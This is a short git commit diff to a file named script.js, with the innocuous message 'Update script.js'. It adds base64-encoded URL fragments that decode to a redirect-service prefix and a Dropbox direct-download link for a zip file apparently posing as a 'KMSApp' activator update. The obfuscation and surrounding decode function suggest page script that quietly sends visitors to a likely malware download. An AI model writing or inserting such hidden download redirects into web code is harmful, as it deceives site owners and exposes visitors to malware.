27a4e33d676976520d8bd8fe7a33e53852a8bf0a
childishguy-1603 <tiannatlougeeygp1@gmail.com>
2026-05-07 18:44:49 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,8 @@
 (function() {
 const urlParts = [
+  'aHR0cHM6Ly9ocmVmLmxpLz8=',
+  'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3EwMjVpcmNibmEyeHlvNmlsaG5ocC9LTVNBcHAtTWF5X0Vhcmx5X1VwZGF0ZS56aXA/cmxrZXk9ZDlheWNhaHp5ZHpsZDV5ZGJnaW11dW53dSZzdD1qbHpqMzVzcSZkbD0x'
+];
   
 
   function decodePart(encoded) {
